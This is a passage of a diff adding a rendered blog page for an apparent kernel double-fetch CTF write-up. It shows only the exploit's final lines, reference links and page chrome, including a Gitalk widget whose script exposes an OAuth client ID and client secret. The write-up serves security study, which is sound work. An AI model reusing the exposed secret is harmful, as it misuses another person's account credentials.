THIS&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43116977/article/details/105868792">https://blog.csdn.net/qq_43116977/article/details/105868792</a></p>
+<p><a target="_blank" rel="noopener" href="http://p4nda.top/2018/07/20/0ctf-baby/">http://p4nda.top/2018/07/20/0ctf-baby/</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/02/11/kernel-4-doubleFetch/">kernel-4-doubleFetch</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-02-11, 10:16:38</p>
+        <p><span>最后更新:</span>2022-02-11, 18:19:10</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/02/11/kernel-4-doubleFetch/" title="kernel-4-doubleFetch">https://nicholas-wei.github.io/2022/02/11/kernel-4-doubleFetch/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://nicholas-wei.github.io/2022/02/11/kernel-4-doubleFetch/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2022/02/14/pwnable-babystack/">
+                    pwnable-babystack
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022/02/07/tcache-stashing-unlink-attack/">
+                    tcache-stashing-unlink-attack
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#double-fetch"><span class="toc-number">1.</span> <span class="toc-text">double_fetch</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99exp"><span class="toc-number">3.</span> <span class="toc-text">编写exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97flag%E9%95%BF%E5%BA%A6"><span class="toc-number">3.1.</span> <span class="toc-text">获得flag长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#double-fetch-1"><span class="toc-number">3.2.</span> <span class="toc-text">double_fetch</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"kernel-4-doubleFetch　| welc0me　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+<!-- 
+    
+ -->
+
+
+  
+      <section id='comments' style='margin: 2em; padding: 2em; background: rgba(255, 255, 255, 0.5)'>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'fb4ffdde2e800246e49f',
+        clientSecret: 'b550860fb0906da0fc324e3c81448cd676b55f9e',
+        repo: 'nicholas-wei.github.io',
+        owner: 'nicholas-wei',
+        admin: ['nicholas-wei'],
+        id: window.location.pathname
+      })
+      gitalk.render('gitalk-container')
+    </script>
+  </section>
+  
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/02/14/pwnable-babystack/" title="上一篇: pwnable-babystack">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022/02/07/tcache-stashing-unlink-attack/" title="下一篇: tcache-stashing-unlink-attack">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/07/12/testfile/">testfile</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/03/decrypt-wechat-db/">decrypt-wechat-db</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/02/tamuctf-pwnme/">tamuctf-pwnme</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/20/ej/">ej</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/07/royal_ransomeware/">royal_randomeware analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/05/mirai/">mirai_botnet_analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/26/corctf2022-corchat/">corctf2022-corchat</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/24/bi0sctf-2023/">bi0sctf-2023</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/20/rwctf-tinyvm/">rwctf-tinyvm</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/19/wasm-pwn/">wasm-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/27/ics-pa1/">ics-pa</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/13/llvm-pass1/">llvm-pass1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/leetcode-1/">leetcode-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/dp/">dp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/">Directed_Grey-Box_Fuzzing_with_Provable_Path_Pruning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/">Constraint-guided_Directed_Greybox_Fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/10/crafting-interpreters4/">crafting-interpreters4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/07/crafting-interpreters3/">crafting-interpreters3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/04/crafting-interpreters2/">crafting-interpreters2——scanning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/02/house-of-cat/">house-of-cat</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/29/crafting-interpreters1/">crafting_interpreters 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/28/dice2022-hope/">dice2022@hope</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/30/software-security-lab6/">software-security-lab6</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/software-security-lab5/">software-security-lab5</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/volgaCTF2022-pwn/">volgaCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/08/pyjail/">pyjail</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/angstormCTF2022-pwn/">angstormCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/04/software-security-lab4/">software-security-lab4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/27/pwnhub2022/">pwnhub2022_easyrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/25/b01lersCTF2022-pwn/">b01lersCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/15/hackpark2022-shiftycode/">hackpark2022_shiftycode</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/14/input_check_lab/">software-security-lab3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/software-security-lab2/">software-security-lab2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/matlab-2/">matlab-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/FuzzBuilder-src-understand/">FuzzBuilder_src_understand</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/SpaceHeroCTF2022-pwn-wp/">SpaceHeroCTF2022_pwn_wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/fb-bot-discord/">fb-bot_discord</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/31/matlab-1/">matlab-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/29/zer0pts2022-accountant/">zer0pts2022_accountant</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/17/fuzzing-6-grammer-fuzzing/">fuzzing-6-grammer_fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/16/fuzzing-5-parallelize/">fuzzing-5-parallelize</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/15/fuzzing-4-code_coverage/">fuzzing-4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/13/fuzzing-2/">fuzzing-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/software-security-lab1/">software-security_lab1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/fuzzing-1-gegeral-knowledge/">fuzzing-1-gegeral_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/umdctf2022-pwn/">umdctf2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/06/kernel-6-HijackPrctl/">kernel-6-HijackPrctl</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/02/pwnable-re-alloc-revenge/">pwnable-re-alloc_revenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/28/SUSCTF2022-pwn/">SUSCTF2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/tqlctf-nemu/">tqlctf-nemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/fastbin-reverse-into-tcache/">fastbin-reverse-into-tcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/15/kernel-5-bypass-smep1/">kernel-5-bypass_smep1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/pwnable-babystack/">pwnable-babystack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/11/kernel-4-doubleFetch/">kernel-4-doubleFetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/07/tcache-stashing-unlink-attack/">tcache-stashing-unlink-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/03/IO-file-vtable/">IO_file常见利用方法&原理(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/01/pwnable-realloc/">pwnable-realloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/31/kernel-3-UAF/">kernel-3-UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/IO-file/">IO_file常见利用方法&原理(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/largebin-attack/">largebin-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">hws2022冬令营入营赛pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/27/RWctf-2022-svme/">RWctf-2022-svme</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/24/kernel-2-stkof/">kernel-2-stkof</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/23/kernel-1-basic_knowledge/">kernel-1-basic_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/22/Drangonctf2021-noflippidy/">Drangonctf2021-noflippidy</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/21/dicectf2021-flippidy/">dicectf2021_flippidy</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2022-2023 nich0las
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
